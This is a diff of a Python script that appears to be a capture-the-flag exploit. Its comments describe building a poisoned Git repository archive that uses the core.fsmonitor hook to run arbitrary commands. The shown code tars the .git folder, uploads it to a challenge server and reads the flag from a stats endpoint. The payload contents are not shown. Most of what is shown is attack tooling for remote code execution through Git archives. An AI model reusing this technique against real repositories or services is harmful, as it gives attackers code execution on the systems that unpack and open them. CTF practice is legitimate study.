@@ -18,13 +18,12 @@ all while maintaining a frictionless, zero-config user experience
 '''
 
 comments = '''
-    Utility script that crafts a malicious Git repository archive (.tar)
-    Exploits the `core.fsmonitor` configuration hook by embedding an executable payload
-    in `.git/hooks/fsmonitor` to execute arbitrary commands upon Git lifecycle events
+    Utility script that crafts a malicious Git repository archive (.tar). Exploits the "core.fsmonitor" configuration
+    hook by embedding an executable payload in ".git/hooks/fsmonitor" to execute arbitrary commands upon Git lifecycle events
 '''
 
 tags = '''
-    #git #fsmonitor #git-hooks #remote-code-execution #ctf #web-exploitation #archive-poisoning
+    #git #fsmonitor #git-hooks #remote-code-execution #archive-poisoning
 '''
 
 class Py_testing:
@@ -58,17 +57,16 @@ class Py_testing:
         subprocess.run('tar -czvf exploit.tar .git', shell=True)
     
     def analyze_file():
-        tar_file = 'exploit.tar'
-        upload_url = 'http://https://git-gud-e45eb0897704b2c6-global.challs.brunnerne.xyz/upload'
-        stats_url = 'http://https://git-gud-e45eb0897704b2c6-global.challs.brunnerne.xyz/stats'
+        UPLOAD_URL = 'http://https://git-gud-e45eb0897704b2c6-global.challs.brunnerne.xyz/upload'
+        STATS_URL = 'http://https://git-gud-e45eb0897704b2c6-global.challs.brunnerne.xyz/stats'
 
-        with open(tar_file, 'rb') as f:
-            files = {'file': (tar_file, f, 'application/x-tar')}
-            response = requests.post(upload_url, files=files).json()
+        with open('exploit.tar', 'rb') as f:
+            files = {'file': ('exploit.tar', f, 'application/x-tar')}
+            response = requests.post(UPLOAD_URL, files=files).json()
 
-        git_id = response['id']
+        GIT_ID = response['id']
 
-        response = requests.get(f'{stats_url}/{git_id}').json()
+        response = requests.get(f'{STATS_URL}/{GIT_ID}').json()
 
         # Try to change the number, 1, 2 or 3 to see the flag
         print(response['status'][3])
